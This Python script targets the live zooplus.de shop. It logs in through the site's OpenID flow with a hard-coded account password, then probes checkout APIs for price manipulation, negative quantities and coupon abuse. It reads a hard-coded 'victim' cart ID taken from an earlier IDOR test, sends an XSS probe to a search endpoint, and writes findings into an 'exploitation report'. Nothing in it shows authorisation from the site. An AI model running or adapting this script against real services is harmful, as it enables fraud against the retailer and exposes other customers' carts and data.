#!/usr/bin/env python3
"""Test Found Endpoints for Vulnerabilities"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

vulns = []

# Known victim cart UUID from IDOR test
VICTIM_CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

print("\n[*] Testing endpoints for vulnerabilities...")

# 1. Test business logic - price manipulation
print("\n[1] Testing price manipulation...")
endpoint = "/semiprotected/api/checkout/state-api/v2/set-article-quantity"

# Try to set price to 0.01
resp = s.put(f"{base}{endpoint}", json={"articleId": 2966422, "quantity": 1, "price": 0.01}, timeout=5, verify=False)
if resp.status_code == 200:
    # Check victim's cart
    resp2 = s.get(f"{base}/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}", timeout=5, verify=False)
    if resp2.status_code == 200:
        cart = resp2.json()
        total = cart.get('summary', {}).get('grandTotal', 0)
        print(f"  [CRITICAL] Price manipulation possible!")
        print(f"      Cart total: {total}")
        vulns.append({"type": "price_manipulation", "severity": "CRITICAL", "endpoint": endpoint, "impact": f"Cart total: {total}"})

# 2. Test negative quantity
print("\n[2] Testing negative quantity...")
resp = s.put(f"{base}{endpoint}", json={"articleId": 2966422, "quantity": -10}, timeout=5, verify=False)
if resp.status_code == 200:
    resp2 = s.get(f"{base}/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}", timeout=5, verify=False)
    if resp2.status_code == 200:
        cart = resp2.json()
        total = cart.get('summary', {}).get('grandTotal', 0)
        print(f"  [CRITICAL] Negative quantity accepted!")
        print(f"      Cart total: {total}")
        vulns.append({"type": "negative_quantity", "severity": "CRITICAL", "endpoint": endpoint, "impact": f"Cart total: {total}"})

# 3. Test coupon/promo endpoints
print("\n[3] Testing coupon endpoints...")
coupon_endpoints = [
    f"/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}/coupon",
    f"/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}/promo",
    f"/semiprotected/api/checkout/state-api/v2/set-coupon",
]

for ep in coupon_endpoints:
    try:
        resp = s.post(f"{base}{ep}", json={"code": "FREE100"}, timeout=5, verify=False)
        if resp.status_code in [200, 201]:
            print(f"  [HIGH] Coupon endpoint works: {ep}")
            vulns.append({"type": "coupon_manipulation", "severity": "HIGH", "endpoint": ep})
    except: pass

# 4. Test subscribe endpoint
print("\n[4] Testing subscribe endpoint...")
try:
    resp = s.post(f"{base}/subscribe/api/register/", json={"email": "test@test.com", "code": "TEST"}, timeout=5, verify=False)
    if resp.status_code in [200, 201]:
        print(f"  [INFO] Subscribe endpoint works")
except: pass

# 5. Test hopps-suggest endpoint
print("\n[5] Testing hopps-suggest endpoint...")
try:
    resp = s.get(f"{base}/hopps-suggest/api/v1/sites/1/de-DE/suggestions", timeout=5, verify=False)
    if resp.status_code == 200:
        data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        print(f"  [INFO] Hopps-suggest works")
        # Test for injection
        resp2 = s.get(f"{base}/hopps-suggest/api/v1/sites/1/de-DE/suggestions?q=<script>alert(1)</script>", timeout=5, verify=False)
        if "<script>" in resp2.text:
            print(f"  [HIGH] XSS possible in hopps-suggest")
            vulns.append({"type": "xss", "severity": "HIGH", "endpoint": "/hopps-suggest/api/v1/sites/1/de-DE/suggestions"})
except: pass

# SUMMARY
print("\n" + "=" * 70)
print("VULNERABILITIES")
print("=" * 70)

if vulns:
    for v in vulns:
        print(f"\n[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'impact' in v:
            print(f"    Impact: {v['impact']}")
    
    # Update FINAL_EXPLOITATION_REPORT.md
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 НАЙДЕННЫЕ УЯЗВИМОСТИ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in vulns:
            f.write(f"### [{v['severity']}] {v['type']}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'impact' in v:
                f.write(f"**Impact:** {v['impact']}\n\n")
            f.write(f"**Status:** Подтверждено\n\n")
            f.write("---\n\n")
    
    print(f"\n[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No new vulnerabilities found")

print("=" * 70)

